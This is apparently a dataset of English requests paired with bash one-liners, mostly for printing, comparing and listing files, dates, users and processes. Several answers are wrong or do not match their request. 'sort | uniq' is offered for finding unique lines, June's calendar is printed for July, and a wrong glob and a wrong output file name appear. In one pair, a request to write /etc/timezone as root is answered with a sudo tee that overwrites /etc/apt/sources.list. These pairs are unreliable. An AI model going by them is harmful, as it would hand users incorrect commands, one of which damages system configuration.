{"input": "Print chmod commands that can change permissions of regular files residing in the current directory tree to u=rw,g=r,o=", "answer": "find . -type f -exec echo chmod u=rw,g=r,o= '{}' \\;"}
{"input": "Print comma separated gaps in file \"file\" that contains new line separated ordered numbers", "answer": "seq $(tail -1 file)|diff - file|grep -Po '.*(?=d)'"}
{"input": "Print command line of process with pid 17709", "answer": "cat /proc/17709/cmdline | xargs -0 echo"}
{"input": "Print command with PID 11383", "answer": "ps | egrep 11383 | tr -s ' ' | cut -d ' ' -f 4"}
{"input": "Print common characters in variable \"$a\" and \"$b\"", "answer": "comm -12 <(echo $a|awk -F\"\\0\" '{for (i=1; i<=NF; i++) print $i}') <(echo $b|awk -F\"\\0\" '{for (i=1; i<=NF; i++) print $i}')|tr -d '\\n'"}
{"input": "Print common files of directory \"1\" and \"2\"", "answer": "comm -12  <(ls 1) <(ls 2)"}
{"input": "Print common files of directory \"one\" and \"two\"", "answer": "comm -12  <(ls one) <(ls two)"}
{"input": "Print common lines of files \"file1\", \"file2\", \"file3\", and \"file4\"", "answer": "comm -12 <(comm -12 <(comm -12 <(sort file1) <(sort file2)) <(sort file3)) <(sort file4)"}
{"input": "Print concatenated content of all files ending with '.foo' under the current folder", "answer": "cat `find . -name '*.foo' -print`"}
{"input": "Print content of 'a' file, showing all non-printing characters including TAB characters, and displaying $ at the end of each line", "answer": "cat -vet a"}
{"input": "Print content of 'filename' file, showing all non-printing characters and displaying $ at the end of each line", "answer": "cat -v -e filename"}
{"input": "Print content of all files ending with '*.foo' in current directory recursively", "answer": "find . -name '*.foo' -exec cat {} \\;"}
{"input": "Print content of all files ending with '*.foo' under the current directory", "answer": "cat $(find . -name '*.foo')"}
{"input": "Print content of all files found regarding seach options '[whatever]'", "answer": "find [whatever] -exec cat {} +"}
{"input": "Print content of each file under the current directory followed by that file name", "answer": "find . -type f -exec cat {} \\; -print"}
{"input": "Print contents of \"file\" as space separated hexadecimal bytes on a single line", "answer": "od -t x1 -An file |tr -d '\\n '"}
{"input": "Print continuous characters '/' and '\\' randomly from /dev/urandom", "answer": "grep -ao \"[/\\\\]\" /dev/urandom|tr -d \\\\n"}
{"input": "Print continuous lines of 100 random characters either \".\" or \" \"", "answer": "cat /dev/urandom | tr -dc '. ' | fold -w 100"}
{"input": "Print count of unique lines in all files like 'list_part*'", "answer": "cat list_part* | sort --unique | wc -l"}
{"input": "Print crontabs of all users in system, skipping messages that some users don`t have crontab", "answer": "cat /etc/passwd | sed 's/^\\([^:]*\\):.*$/crontab -u \\1 -l 2>\\&1/' | sh | grep -v \"no crontab for\""}
{"input": "Print current UTC date in ISO format with precision to seconds", "answer": "date -u -Iseconds"}
{"input": "Print current shell using process ID", "answer": "ps  -ef | grep $$ | grep -v grep"}
{"input": "Print details for all files in the ./work directory tree with extension .sh that were modified less than 20 days ago", "answer": "find ./work/ -type f -name \"*.sh\" -mtime -20 | xargs -r ls -l"}
{"input": "Print differences between files in directories folder1 and folder2 recursively, with unified context, ignoring changes in the amount of white space", "answer": "diff -bur folder1/ folder2/"}
{"input": "Print directories in the the current directory as a list with no report information", "answer": "tree -d -L 1 -i --noreport"}
{"input": "Print disk of mount point \"/pa/th\"", "answer": "mount | awk '$3 == \"/pa/th\" {print $1}'"}
{"input": "Print each character in \"Hello\" as a hexadecimal value", "answer": "echo -n \"Hello\" | od -A n -t x1"}
{"input": "Print each character in \"orange\" on a new line", "answer": "echo orange | fold -w 1"}
{"input": "Print each character of \"abcdefg\" on a line", "answer": "echo \"abcdefg\" | fold -w1"}
{"input": "Print each line in \"f1\" and \"f2\" separated by a space and \"f3\" separated by a tab", "answer": "paste <(paste -d\" \" f1 f2) f3"}
{"input": "Print each line in \"file1\" and file2\" separated by a space", "answer": "paste -d'\u00a4' file1 file2 | sed 's,\u00a4, ,g'"}
{"input": "Print each line in \"file1\" and file2\" separated by tabs and \"file3\" separated by a space", "answer": "paste -d\" \" file1 file2 | paste -d'|' - file3 | sed 's,|, ,g'"}
{"input": "Print each line in \"file1\" whose first word does not exist as the first word of any line in \"file2\"", "answer": "join -v 1 <(sort file1) <(sort file2)"}
{"input": "Print each line in \"file1.txt\" that is not found in \"file2.txt\"", "answer": "sort file1.txt file2.txt file2.txt | uniq -u"}
{"input": "Print each line in \"set1\" and \"set2\" that does not exist in the other", "answer": "sort set1 set2 | uniq"}
{"input": "Print each line in parallel in files \"tmp/sample-XXX.tim\" and \"tmp/sample-XXX.log\"", "answer": "paste tmp/sample-XXXX.{tim,log}"}
{"input": "Print each logged in user's full name", "answer": "finger -l | grep \"Name:\" | cut -d \":\" -f 3 | cut -c 2- | sort | uniq"}
{"input": "Print each logged in user's username and full name", "answer": "finger -l | grep \"Name:\" | tr -s ' ' | cut -d \" \" -f 2,4- | sort | uniq"}
{"input": "Print either \"one\" or \"two\" randomly three times", "answer": "yes $'one\\ntwo' | head -10 | nl | sort -R | cut -f2- | head -3"}
{"input": "Print environment variable \"IFS\" and its value", "answer": "set | grep ^IFS="}
{"input": "Print equal lines in compressed files \"number.txt\" and \"xxx.txt\"", "answer": "comm -12 <(zcat number.txt.gz) <(zcat xxx.txt.gz)"}
{"input": "Print every 20 bytes of standard input as tab separated groups of bytes 1-3, 4-10, and 11-20", "answer": "fold -b -w 20 | cut --output-delimiter $'\\t' -b 1-3,4-10,11-20"}
{"input": "Print every 3 characters of standard input as a line", "answer": "fold -w3"}
{"input": "Print every 4th line from 10 lines of \"y\" with line numbers", "answer": "yes | cat -n | head -10 | awk 'NR % 4 == 1'"}
{"input": "Print every file's type, name, and inode", "answer": "find -printf \"%y %i %prn\""}
{"input": "Print every found file like '*.cfg' under '/path/to/files/' directory followed by its content, and wait 2 seconds after each printed file", "answer": "find /path/to/files -type f -name \\*.cfg  -print -exec cat {} \\; -exec sleep 2 \\;"}
{"input": "Print every three lines of \"file\" as a comma separated line", "answer": "paste -sd',,\\n' file"}
{"input": "Print every two lines in \"file\" on a single line separated by a space", "answer": "cat file | paste -d' ' - -"}
{"input": "Print every two lines in \"num.txt\" on a single line separated by a space", "answer": "paste -d' ' <(sed -n 'p;n' num.txt) <(sed -n 'n;p' num.txt)"}
{"input": "Print extended file information for regular files found under the home directory whose names start with my", "answer": "find . -name 'my*' -type f -ls"}
{"input": "Print file extension assuming there is only one dot in the file name", "answer": "echo \"$FILE\" | cut -d'.' -f2"}
{"input": "Print file information of command \"bash\"", "answer": "echo $(ls -l $(which bash))"}
{"input": "Print file information of command \"passwd\"", "answer": "ls -l `which passwd`"}
{"input": "Print file information of command \"studio\"", "answer": "ls -l \"$( which studio )\""}
{"input": "Print file information of the executable file of command \"g++\"", "answer": "ls `which g++` -al"}
{"input": "Print file information of the executable file of command \"gcc\"", "answer": "ls `which gcc` -al"}
{"input": "Print file name without extension assuming there is only one dot in the file name", "answer": "echo \"$FILE\" | cut -d'.' -f1"}
{"input": "Print file name without the last two extensions assuming the file name doesn't contain any other dots", "answer": "echo \"$FILE\" | cut -d'.' --complement -f2-"}
{"input": "Print file names of all files ending with '*.csv' in  '/home/ABC/files/' directory", "answer": "ls /home/ABC/files/*.csv | rev | cut -d/ -f1 | rev"}
{"input": "Print file size and user name with color support for each file in the current directory tree", "answer": "tree -Csu"}
{"input": "Print file size with the file name", "answer": "find . -name '*.ear' -exec du -h {} \\;"}
{"input": "Print file system disk space usage and grand total for the root file system with sizes in powers of 1000", "answer": "df -H --total /"}
{"input": "Print file system disk space usage in posix and human readable format, format as a table", "answer": "df -Ph | column -t"}
{"input": "Print file system disk space usage with a grand total", "answer": "df --total"}
{"input": "Print file system disk space usage with sizes in powers of 1000", "answer": "a=$( df -H )"}
{"input": "Print file type information of the \"java\" executable", "answer": "cat `which java` | file -"}
{"input": "Print file type of command \"gcc\"", "answer": "file -L `which gcc`"}
{"input": "Print file type of the command \"c++\"", "answer": "file `which c++`"}
{"input": "Print file type of the executable file of command \"file\"", "answer": "file `which file`"}
{"input": "Print file type of the executable file of command \"python\"", "answer": "file `which python`"}
{"input": "Print files created/modified in the last day", "answer": "find /directory -newermt $(date +%Y-%m-%d -d '1 day ago') -type f -print"}
{"input": "Print first 11 characters from $line, print a tab, print the md5 sum of the file specified by the 13th and onward characters from $line and print a null character at end without a trailing new line", "answer": "echo -en \"${line:0:11}\" \"\\t\" $(md5sum \"${line:12}\") \"\\0\""}
{"input": "Print first column of every line in every *.txt separated by a space", "answer": "paste -d':' *.txt | sed 's/ [^:]*$//;s/ [^:]*:*/ /g;s/://g'"}
{"input": "Print first field from semicolon-seprated line $string", "answer": "echo $string | cut -d';' -f1"}
{"input": "Print first word of lines unique for 'file1' file", "answer": "grep -o '^\\S\\+' <(comm file1 file2)"}
{"input": "Print fourth column of space-separated data from text file text.txt", "answer": "cat text.txt | cut -d \" \" -f 4"}
{"input": "Print full date of yesterday", "answer": "echo `date -v-1d +%F`"}
{"input": "Print groups of all users logged in", "answer": "groups $(who | cut -d' ' -f 1)"}
{"input": "Print history with the first field removed", "answer": "history | awk '{sub($1, \"\"); sub(/^[ \\t]+/, \"\"); print}'"}
{"input": "Print host name without a newline", "answer": "echo -n `hostname`"}
{"input": "Print how many files are inside each directory under the current one", "answer": "find */ | cut -d/ -f1 | uniq -c"}
{"input": "Print info about all mounted file systems", "answer": "df"}
{"input": "Print info about thread number of process with pid 1", "answer": "cat /proc/1/sched  | head -n 1"}
{"input": "Print information of the process running the current script as the current user", "answer": "ps -ef | grep $0 | grep $(whoami)"}
{"input": "Print inode, permissions, size, and modification date of all files in the current directory tree as a list with an extra column prepended", "answer": "tree -afispugD --inodes | awk '{FS=\"./\"; ORS=\"\"; printf(\"%-60s%s\\n\",$NF,$0)}'"}
{"input": "Print input \"your, text, here\" formatted to fit 70 characters per line breaking at spaces", "answer": "echo 'your, text, here' | fold -sw 70"}
{"input": "Print joined strings from 'file', using space symbol as separator", "answer": "cat file | xargs"}
{"input": "Print last day of April, 2009", "answer": "cal 4 2009 | tr ' ' '\\n' | grep -v ^$ | tail -n 1"}
{"input": "Print last four bytes of string '0a.00.1 usb controller some text device 4dc9'", "answer": "echo 0a.00.1 usb controller some text device 4dc9 | rev | cut -b1-4 | rev"}
{"input": "Print line number \"${linenum}\" in file \"$filename\"", "answer": "cat $filename | sed \"${linenum}p;d\";"}
{"input": "Print line number of each line in /etc/passwd file, where current user name is found", "answer": "cat /etc/passwd -n | grep `whoami` | cut -f1"}
{"input": "Print line, word and byte count for each file recursively and also show the total counts", "answer": "wc `find`"}
{"input": "Print line, word and byte counts for each .php files in current directory tree and also show the total counts", "answer": "wc `find | grep .php$`"}
{"input": "Print lines 15967 to 16224 in file \"dump.txt\"", "answer": "cat dump.txt | head -16224 | tail -258"}
{"input": "Print lines 16225 to 16482 in file \"file\"", "answer": "cat file | head -n 16482 | tail -n 258"}
{"input": "Print lines containing string TEXT from all log files in the current directory", "answer": "grep -e TEXT *.log | cut -d':' --complement -s -f1"}
{"input": "Print lines in \"file1\" that exist in \"file2\"", "answer": "join -t \" \" -j 1 <(sort file1) <(sort file2)"}
{"input": "Print lines in \"file1.txt\" that do not exist in \"file2.txt\"", "answer": "sort <(sort -u file1.txt) file2.txt file2.txt | uniq -u"}
{"input": "Print lines in \"foo.txt\" that are found only once", "answer": "sort foo.txt | uniq"}
{"input": "Print lines in file 'file' that do not match any word specified in file 'blacklist' (one word per line)", "answer": "grep -w -v -f blacklist file"}
{"input": "Print lines that only unique ones in 'set1' and 'set2' files", "answer": "cat <(grep -vxF -f set1 set2) <(grep -vxF -f set2 set1)"}
{"input": "Print linker search path using gcc formatted on new lines", "answer": "gcc -print-search-dirs | sed '/^lib/b 1;d;:1;s,/[^/.][^/]*/\\.\\./,/,;t 1;s,:[^=]*=,:;,;s,;,;  ,g' | tr \\; \\\\012"}
{"input": "Print list of all user names who are logged in", "answer": "who | awk '{ print $1 }'"}
{"input": "Print list of disk and mountpoint of disks matching \"/dev/sd*\"", "answer": "mount | awk '/\\/dev\\/sd/ {print NR, $1, $3}'"}
{"input": "Print local SRV record of domain '_etcd-client._tcp.'", "answer": "dig @\"127.0.0.1\"  _etcd-client._tcp. SRV"}
{"input": "Print local files without descending non-local directories", "answer": "find . ! -local -prune -o -print"}
{"input": "Print login information of all users except the first two and replace all instances of \" \" with \", \"", "answer": "who | awk '{ if (NR!=1 && NR!=2) {print} }' | sed -e 's/ /, /g'"}
{"input": "Print login name and full name of all users currently logged in", "answer": "finger -l | awk '/^Login/'"}
{"input": "Print login name and full name of all users currently logged in and delete instances of \"of group.*\"", "answer": "finger -l | awk '/^Login/' | sed 's/of group.*//g'"}
{"input": "Print ls output for all non-empty files under under current directory", "answer": "find . -type f ! -size 0 -exec ls -l '{}' \\;"}
{"input": "Print mount point of the file system containing $filename", "answer": "df \"$filename\" | awk 'NR==1 {next} {print $6; exit}'"}
{"input": "Print mount point of the file system containing $path", "answer": "df \"$path\" | tail -1 | awk '{ print $6 }'"}
{"input": "Print multiline text \"ONBOOT=\\\"YES\\\"\\nIPADDR=10.42.84.168\\nPREFIX=24\" to the terminal, replacing '\\n' with newline symbol, and append that text to file /etc/sysconfig/network-scripts/ifcfg-eth4 as root user", "answer": "echo -e \"ONBOOT=\\\"YES\\\"\\nIPADDR=10.42.84.168\\nPREFIX=24\" | sudo tee -a /etc/sysconfig/network-scripts/ifcfg-eth4"}
{"input": "Print name of the block device containing the file system containing $path", "answer": "df -P \"$path\" | awk 'BEGIN {FS=\"[ ]*[0-9]+%?[ ]+\"}; NR==2 {print $1}'"}
{"input": "Print name of the file system containing $path", "answer": "df -h $path | cut -f 1 -d \" \" | tail -1"}
{"input": "Print new line separated numbers from \"001\" to \"100\"", "answer": "yes | nl -ba | tr ' ' 0 | sed 100q | cut -b 4-6"}
{"input": "Print newline, word and byte count for all .h, .c, .cpp, .php and .cc files under current directory tree and also show the total counts", "answer": "wc `find . -name '*.[h|c|cpp|php|cc]'`"}
{"input": "Print newline, word, and byte counts of each '*.java' file within current directory, and total newline, word, and byte counts", "answer": "find . -name \\*.java | tr '\\n' '\\0' | xargs -0 wc"}
{"input": "Print nothing because 'MYVAR' string doesn`t match with '/[^/]+:' pattern", "answer": "echo MYVAR | grep -oE '/[^/]+:' | cut -c2- | rev | cut -c2- | rev"}
{"input": "Print nothing because B.txt is compared with itself", "answer": "comm -2 -3 <(sort -n B.txt) <(sort -n B.txt)"}
{"input": "Print numerically sorted list of unique strings from 'ip_addresses' file, with number of occurrences of each string", "answer": "sort -n ip_addresses.txt | uniq -c"}
{"input": "Print onlt last slash-separated field from $PATH value", "answer": "echo \"$PATH\" | rev | cut -d\"/\" -f1 | rev"}
{"input": "Print only alphanumeric values from \"/dev/urandom\"", "answer": "cat /dev/urandom | tr -dc 'a-zA-Z0-9'"}
{"input": "Print only common file names in sorted listings of directory 'dir1' and 'dir2'", "answer": "comm -1 -2 <(ls /dir1 | sort) <(ls /dir2 | sort)"}
{"input": "Print only common strings in content of files 'file1.sorted' and 'file2.sorted'", "answer": "comm -1 -2 file1.sorted file2.sorted"}
{"input": "Print only digits in variable \"$name\"", "answer": "echo $name | tr -c -d 0-9"}
{"input": "Print only first line of 'file' content, formatted as 29-symbol wide column", "answer": "cat file | fold -w29 | head -1"}
{"input": "Print only first line of 'file' content, formatted as 29-symbol wide column, regarding space symbol as a word separator", "answer": "cat file | fold -s -w29 | head -1"}
{"input": "Print only lines from 'file1.txt' that not present in 'file2.txt' and beginning with 'Q'", "answer": "cat file1.txt | grep -Fvf file2.txt | grep '^Q'"}
{"input": "Print only name and login columns of the currently logged in users", "answer": "finger -s | awk '{printf(\"%s %s\\n\", $1, $2);}'"}
{"input": "Print only printable characters from \"/dev/urandom\"", "answer": "cat /dev/urandom | tr -dC '[:graph:]'"}
{"input": "Print only second from the end field from slash-separated string in file 'datafile'", "answer": "cat datafile | rev | cut -d '/' -f 2 | rev"}
{"input": "Print only strings from file 'file2' that not found in 'file1'", "answer": "comm -1 -3 file1 file2"}
{"input": "Print only the number of lines in file \"$f\"", "answer": "wc -l $f | tr -s ' ' | cut -d ' ' -f 1"}
{"input": "Print only unique lines in files 'set1' and 'set2'", "answer": "cat set1 set2 | sort -u"}
{"input": "Print only unique lines of 'file_name' file", "answer": "cat -n file_name | sort -uk2 | sort -nk1 | cut -f2-"}
{"input": "Print out all files with their paths that have identical content and the same filename in different cases", "answer": "find * -type f  | xargs md5sum | sort | uniq -Dw32 | awk -F'[ /]' '{ print $NF }' | sort -f | uniq -Di"}
{"input": "Print out every command that is executed in the script", "answer": "set -x"}
{"input": "Print out ln commands for each file in /home/folder1/*.txt that can be run to create symlinks appending '_CUSTOM_TEXT.txt' in their names", "answer": "find /home/folder1/*.txt -type f | awk -F '.txt' '{printf \"ln -s %s %s_CUSTOM_TEXT.txt\\n\", $0, $1}'"}
{"input": "Print out the contents of all *.txt files in the home directory", "answer": "find ~ -name '*.txt' -print0 | xargs -0 cat"}
{"input": "Print out the full path name of \"mypathname\" with dots resolved", "answer": "readlink -ev mypathname"}
{"input": "Print out the names and types of all files in the current directory tree", "answer": "find . -printf \"%y %p\\n\""}
{"input": "Print output of script 'trap.sh'", "answer": "~ $ . trap.sh | cat"}
{"input": "Print pathname of a file that is connected to the standard output of the command \"yes\"", "answer": "echo <(yes)"}
{"input": "Print pathnames of all files in the current directory and below skipping directories named SCCS and files in them", "answer": "find . -name SCCS -prune -o -print"}
{"input": "Print pathnames of all files in the current directory and below skipping files under SCCS directories", "answer": "find . -print -name SCCS -prune"}
{"input": "Print paths to all subdirectories inside of a directory", "answer": "du | awk '{print $2}'"}
{"input": "Print percents of the space used on the file system containing path to the current working directory", "answer": "df . -B MB | tail -1 | awk {'print substr($5, 1, length($5)-1)'}"}
{"input": "Print position number of day '9' in fourth line of calendar output for September, 2009", "answer": "cal 09 2009 | awk 'BEGIN{day=\"9\"}; NR==4 {col=index($0,day); print col }'"}
{"input": "Print process tree, adjusting output width with a screen size", "answer": "pstree | cat"}
{"input": "Print received input to the terminal", "answer": "tee"}
{"input": "Print relative path of device of disk with UUID \"b928a862-6b3c-45a8-82fe-8f1db2863be3\"", "answer": "readlink /dev/disk/by-uuid/b928a862-6b3c-45a8-82fe-8f1db2863be3"}
{"input": "Print revesed second from the end dot-bounded field in $i value", "answer": "j=`echo $i | rev | cut -d \".\" -f2`;"}
{"input": "Print right aligned numbers from 11 to 24", "answer": "yes '' | nl -ba | sed -n -e 11,24p -e 24q"}
{"input": "Print second field from semicolon-seprated line $string", "answer": "echo $string | cut -d';' -f2"}
{"input": "Print second field from semicolon-seprated line <line>", "answer": "echo \"<line>\" | cut -d \";\" -f 2"}
{"input": "Print second section of data coming from stdin where sections are separated by one or more whitespace", "answer": "tr -s ' ' | cut -d ' ' -f 2"}
{"input": "Print second section of line <line> where sections are separated by one or more whitespace", "answer": "echo -e \"<line>\" | sed 's:\\s\\+:\\t:g' | cut -f2"}
{"input": "Print second section of space-separated data coming from stdin", "answer": "cut -d ' ' -f 2"}
{"input": "Print sed commands that would replace all occurrences of 'previousword' with 'newword' in all regular files with '.cpp' extension under '/myprojects' directory tree", "answer": "find /myprojects -type f -name '*.cpp' -print0 |    xargs -0 echo sed -i 's/previousword/newword/g'"}
{"input": "Print short DNS lookup for each domain name in a file 'list'", "answer": "dig +short -f list"}
{"input": "Print short TXT record of domain o-o.myaddr.l.google.com from nameserver 8.8.8.8", "answer": "dig TXT +short o-o.myaddr.l.google.com @8.8.8.8"}
{"input": "Print short TXT record of domain o-o.myaddr.l.google.com from nameserver ns1.google.com", "answer": "dig TXT +short o-o.myaddr.l.google.com @ns1.google.com"}
{"input": "Print sorted list of unique users logged in followed by a total count", "answer": "who | awk '{ print $1; }' | sort -u | awk '{print $1; u++} END{ print \"users: \" u}'"}
{"input": "Print source directory of bash script", "answer": "dirname \"$(readlink -f \"$0\")\""}
{"input": "Print space separated list of numbers from \"$start\" to \"$end\"", "answer": "echo `seq $start $end`"}
{"input": "Print space separated numbers from 1 to 10", "answer": "seq 10 | xargs echo"}
{"input": "Print string \"123\" once with '1' replaced by 'a' and second time replaced by 'b'", "answer": "echo 123 | tee >(tr 1 a)  | tr 1 b"}
{"input": "Print symlink resolved script file name", "answer": "echo $(basename $(readlink -nf $0))"}
{"input": "Print three lines of \"some line \" followed by a random number", "answer": "seq -f 'some line %g' 500 | nl | sort -R | cut -f2- | head -3"}
{"input": "Print timestamp as HH:MM:SS", "answer": "date +\"%T\""}
{"input": "Print type of the file system containing path $dir", "answer": "df -T $dir | tail -1 | awk '{print $2;}'"}
{"input": "Print unique lines in \"file1\" compared to \"file2\" in the order they appear", "answer": "comm -23 <(sort file1) <(sort file2)|grep -f - file1"}
{"input": "Print unique lines in \"file_a\" and \"file_b\"", "answer": "sort file_a file_b|uniq -u"}
{"input": "Print unique lines in \"set1\" and \"set2\" when compared to each other and remove any tabs", "answer": "comm -3 <(sort set1) <(sort set2) | sed 's/\\t//g'"}
{"input": "Print unique lines in sorted file \"A\" when compared to sorted files \"B\", \"C\", and \"D\"", "answer": "comm -2 -3 A B | comm -2 -3 - C | comm -2 -3 - D"}
{"input": "Print unique lines of \"a\" and \"b\"", "answer": "comm -3 a b"}
{"input": "Print unique lines of \"second-file-sorted.txt\" compared to \"first-file-sorted.txt\"", "answer": "comm -23 second-file-sorted.txt first-file-sorted.txt"}
{"input": "Print unique lines of sorted file \"A.txt\" compared to sorted file \"B.txt\"", "answer": "comm -2 -3 <(sort A.txt) <(sort B.txt)"}
{"input": "Print unique lines of sorted file \"a\" and \"b\" and remove leading tabs", "answer": "comm -3 a b | sed 's/^\\t//'"}
{"input": "Print unique lines of sorted file \"f1\" compared to sorted file \"f2\"", "answer": "comm -2 -3 f1 f2"}
{"input": "Print unique lines of sorted file \"file1\" when compared with the list of first space separated fields of all sorted strings of file \"file2\"", "answer": "cut -d' ' -f1 file2 | comm -13 - file1"}
{"input": "Print unique list of who is logged in and the time of login formatted in columns", "answer": "who -su | sort | uniq | column"}
{"input": "Print variable \"$module\" in formatted columns with at most 80 characters per line", "answer": "echo $modules | column -t | fold | column -t"}
{"input": "Print whether \"$file\" and \"${file/${dir1}/${dir2}}\" differ", "answer": "diff -q \"$file\" \"${file/${dir1}/${dir2}}\""}
{"input": "Print whether the sorted contents of \"set1\" and \"set2\" differ", "answer": "diff -q <(sort set1) <(sort set2)"}
{"input": "Print whether the unique contents of \"set1\" and \"set2\" differ", "answer": "diff -q <(sort set1 | uniq) <(sort set2 | uniq)"}
{"input": "Print which files differ between \"dir1/\" and \"dir2/\"", "answer": "diff --brief -r dir1/ dir2/"}
{"input": "Print which files differ between \"folder1\" and \"folder2\" treating all files as text", "answer": "diff -arq folder1 folder2"}
{"input": "Print which files differ between dir1 and dir2, treating absent files as empty", "answer": "diff --brief -Nr dir1/ dir2/"}
{"input": "Print which files differ in \"PATH1/\" and \"PATH2/\" recursively excluding any files that match any pattern in \"file1\"", "answer": "diff PATH1/ PATH2/ -rq -X file1"}
{"input": "Print which files differ in \"dir1\" and \"dir2\" recursively", "answer": "diff -qr dir1 dir2"}
{"input": "Print which files differ in \"folder1\" and \"folder2\" excluding \"node_modules\" recursively, output in two columns, and paginate the output", "answer": "diff -rqyl folder1 folder2 --exclude=node_modules"}
{"input": "Print yesterday's date", "answer": "date -j -v-1d"}
{"input": "Print yesterday's date as yyy:mm:dd", "answer": "date +%Y:%m:%d -d \"1 day ago\""}
{"input": "Print yesterday's date information in \"%a %d/%m/%Y\" format", "answer": "date -d \"-1 days\" +\"%a %d/%m/%Y\""}
{"input": "Print your/dir if it's an empty directory", "answer": "find your/dir -prune -empty -type d"}
{"input": "Print your/dir if it's empty", "answer": "find \"your/dir\" -prune -empty"}
{"input": "Prints \"$NEWFILE\" to the terminal and file '/etc/timezone' as a root user", "answer": "echo \"$NEWFILE\" | sudo tee /etc/apt/sources.list"}
{"input": "Prints $m latest modified files within the $d folder, using $f format for printing timestamp", "answer": "find \"$d\" -type f -printf \"%T@ :$f %p\\n\" | sort -nr | cut -d: -f2- | head -n\"$m\""}
{"input": "Prints Kb size of all top-level files and folders in a current folder in descending order in human readable format", "answer": "du -ksh * | sort -n -r"}
{"input": "Prints Kb size of all top-level files and folders in a current folder in descending order", "answer": "du -ks * | sort -n -r"}
{"input": "Prints a process tree for each process of user 'username'", "answer": "ps -aux | grep ^username | awk '{print $2}' | xargs pstree"}
{"input": "Prints a random line from $FILE", "answer": "sort --random-sort $FILE | head -n 1"}
{"input": "Prints a random number between 1 and 10", "answer": "grep -m1 -ao '[0-9]' /dev/urandom | sed s/0/10/ | head -n1"}
{"input": "Prints a random number between 2000 and 65000", "answer": "seq 2000 65000 | sort -R | head -n 1"}
{"input": "Prints all NS servers of domain google.com", "answer": "dig google.com ns | awk 'p{print $5}/^;; ANSWER SECTION:$/{p=1}/^$/{p=0}'"}
{"input": "Prints all Saturday days of a current month", "answer": "cal -h | cut -c19-20"}
{"input": "Prints all child processes of a process with id 20238, separated with comma", "answer": "pstree -p 20238 | sed 's/(/\\n(/g' | grep '(' | sed 's/(\\(.*\\)).*/\\1/' | tr \"\\n\" ,"}
{"input": "Prints all child processes of a process with id 20238", "answer": "pstree -p 20238 | sed 's/(/\\n(/g' | grep '(' | sed 's/(\\(.*\\)).*/\\1/'"}
{"input": "Prints calendar for a current month, replacing current data with asterisk", "answer": "cal -h|sed -r \"s/\\b$(date|cut -d' ' -f3)\\b/*/\""}
{"input": "Prints calendars of July, 2009 and July, 2010 side-by-side", "answer": "paste <(cal 6 2009) <(cal 6 2010)"}
{"input": "Prints current directory name", "answer": "pwd | awk -F/ '{print $NF}'"}
{"input": "Prints date of first Tuesday in January, 2015", "answer": "cal 01 2015 | sed -n '1,2b;/^.\\{6\\} \\{0,1\\}\\([0-9]\\{1,2\\}\\) .*/ {s//0\\1/;s/.*\\([0-9]\\{2\\}\\)$/\\1/p;q;}'"}
{"input": "Prints dates of $m month in $y year, preceded by month number and slash like ' 10/1'", "answer": "cal $m $y | sed -e '1,2d' -e 's/^/ /' -e \"s/ \\([0-9]\\)/ $m\\/\\1/g\""}
{"input": "Prints day of first Tuesday in a month", "answer": "cal | awk 'NR==2 {for (i=1;i<=NF;i++) {sub(/ /,\"\",$i);a[$i]=i}} NR>2 {if ($a[\"Tu\"]~/[0-9]/) {printf \"%02d\\n\",$a[\"Tu\"];exit}}' FIELDWIDTHS=\"3 3 3 3 3 3 3 3\""}
{"input": "Prints directory where the executing script ($0) is located", "answer": "$(dirname $0)"}
{"input": "Prints file descriptor of executed built-in 'true'", "answer": "echo <(true)"}
{"input": "Prints first found folder that contains 'ssh' file and has 'bin' in path", "answer": "dirname `find / -name ssh | grep bin | head -1`"}
{"input": "Prints folder path where $mystring file is located", "answer": "echo dirname: $(dirname $mystring)"}
{"input": "Prints folder where current script is located", "answer": "echo \"dirname: `dirname \"$0\"`\""}
{"input": "Prints full path of a 'cat.wav' file in a current folder", "answer": "ls $PWD/cat.wav"}
{"input": "Prints full path to files in a current folder", "answer": "ls -1 | awk  -vpath=$PWD/ '{print path$1}'"}
{"input": "Prints full path to files with dot in name in a current folder", "answer": "ls -d -1 $PWD/*.*"}
{"input": "Prints groups list that user 'el' belongs to", "answer": "groups el                                     //see that el is part of www-data"}
{"input": "Prints information about active network interfaces in system", "answer": "echo \"$(ifconfig)\""}
{"input": "Prints information about user $euids currently on machine and its processes, without printing header", "answer": "w -h $euids"}
{"input": "Prints last modified file in a current folder with modification time", "answer": "find . -type f -printf '%TY-%Tm-%Td %TH:%TM: %Tz %p\\n'| sort -n | tail -n1"}
{"input": "Prints last modified file in a current folder", "answer": "find . -type f -printf '%T@ %p\\n' | sort -n | tail -1 | cut -f2- -d\" \""}
{"input": "Prints latest modified file in a directory", "answer": "ls -1t | head -1"}
{"input": "Prints line count of each file within current directory", "answer": "find . -type f -print | xargs -L1 wc -l"}
{"input": "Prints list of folders containing '.git', searching recursively from a current folder", "answer": "find . -name '.git' | xargs -n 1 dirname"}
{"input": "Prints list of user 'myuser' groups in a format: 'groups: [comma-separated groups list]'", "answer": "echo \"groups: [ $(groups myuser | sed -e 's/.\\+\\s\\+:\\s\\+\\(.\\+\\)/\\1/g' -e 's/\\(\\s\\+\\)/, /g') ]\""}
{"input": "Prints listing of a root folder including hidden files, and saves output to 'output.file'", "answer": "ls -a | tee output.file"}
{"input": "Prints long listing of a last modified file in a current folder", "answer": "find . -type f -printf '%T@ %p\\n' | sort -n | tail -1 | cut -f2- -d\" \" | sed 's/.*/\"&\"/' | xargs ls -l"}
{"input": "Prints long listing of directories \"./my dir\" and \"./anotherdir\" sorted from oldest to newest, with appended indicators", "answer": "$ ls -Fltr \"./my dir\" \"./anotherdir\""}
{"input": "Prints long listing of directories '/tmp', '/tnt' themselves bordered with '<--' and '--->'", "answer": "ls -ld /tmp /tnt | sed 's/^.*$/<-- & --->/'"}
{"input": "Prints long listing of directory $var sorted from oldest to newest, with appended indicators", "answer": "$ ls -Fltr $var"}
{"input": "Prints long listing of the current directory and top-level directories within, sorted from oldest to newest, with appended indicators", "answer": "$ ls -Fltr *"}
{"input": "Prints long listing of top ten most memory using processes in a system", "answer": "ps -e -orss=,args= | sort -nr | head"}
{"input": "Prints long recursive listing of all content of a current folder, saving output to 'output.file'", "answer": "ls |& tee files.txt"}
{"input": "Prints long recursive listing of all content of a root folder, appending output to 'output.file'", "answer": "ls -lR / | tee -a output.file"}
{"input": "Prints long recursive listing of all content of a root folder, saving output to 'output.file'", "answer": "ls -lR / | tee output.file"}
{"input": "Prints message info about filename and location of the current script", "answer": "echo \"The script you are running has basename `basename $0`, dirname `dirname $0`\""}
{"input": "Prints name of a current shell binary file", "answer": "ls -l /proc/$$/exe | sed 's%.*/%%'"}
